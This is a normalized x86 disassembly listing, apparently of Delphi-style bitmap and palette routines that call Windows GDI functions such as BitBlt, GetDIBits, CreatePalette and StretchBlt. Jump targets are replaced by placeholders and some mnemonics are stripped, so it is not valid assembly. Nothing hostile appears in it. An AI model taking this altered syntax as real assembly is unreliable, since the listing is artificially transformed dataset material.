mov eax [ eax + 0x14 ]
call sub_424f6c
call sub_4242e8
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4242e8
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424f6c
call sub_4242e8
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425b30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403a64
call sub_403a64
jmp r-xdata
sub_429b35
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_429b44
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_4039e0
call sub_403a34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_429ba4
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_429c08
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_4290fc
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_429e03
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_425b30
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425b30
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425b30
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_429dbb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_429540
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_429e14
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_426cb0
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_42936c
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_429e7c
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_42a58c
mov eax [ esi + 0x28 ]
call sub_429370
mov eax [ esi + 0x2c ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_429eb8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_429f70
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402bf8
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42a85c
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_42936c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_429370
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4193d8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_429fa8
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42a58c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42a037
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_429ba4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_429540
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a85c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42a03c
mov eax [ ebp - 0x8 ]
call sub_423a18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4039e0
call sub_403a34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_42a068
push ebx
mov ebx eax
mov eax ebx
call sub_42a35c
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d538
pop ebx
retn
sub_42a098
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41b420
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_42a58c
lea eax [ ebx + 0x2c ]
call sub_40d538
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42a85c
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_42a10c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_42580c
mov eax ebx
call sub_42a69c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_42a498
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_42a348
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_425738
push eax
call SetStretchBltMode
mov eax ebx
call sub_42a3dc
mov dl [ r-xdata ]
call sub_42580c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_42a63c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_42a3dc
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a34f
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42a2dd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_425b30
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_42a3dc
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_425cd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_42a35c
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_42a59c
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_429fa8
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_425a88
sub_42a3dc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_42a59c
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_429178
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_42a068
sub_42a424
push ebx
mov ebx eax
mov eax ebx
call sub_42a58c
mov eax ebx
call sub_42a59c
mov edx ebx
mov eax ebx
call sub_42a068
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_42a448
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_42a4c8
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_4242e8
mov eax ebx
call sub_42a498
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_42a3dc
xor edx edx
pop ecx
call sub_4256c4
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_42a518
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_42a69c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_429540
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_42a59c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41b3bc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_42a61f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_42a63c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_42a58c
mov eax ebx
call sub_42a59c
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_42a4c8
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_429c08
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_4290fc
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_42a69c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_426220
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_4290fc
push 0x0
call GetDC
call sub_425b30
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_42a754
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4259f8
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_429fa8
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_42a58c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402bf8
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_42a7d8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41b39c
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_42aeec
pop esi
pop ebx
retn
sub_42a7fc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push ecx
push 0x2
mov eax [ r-xdata ]
mov cl 0x1
xchg edx ecx
call sub_41bc90
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a850
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a857
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_42a85c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42a8e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_40339c
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_42a943
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_429370
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_42936c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a94a
push rw-data
call LeaveCriticalSection
retn
sub_42a95c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_42aeec
pop edx
pop edi
pop esi
pop ebx
retn
sub_42a984
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_40276c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_42aea1
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_42ae74
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402bf8
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
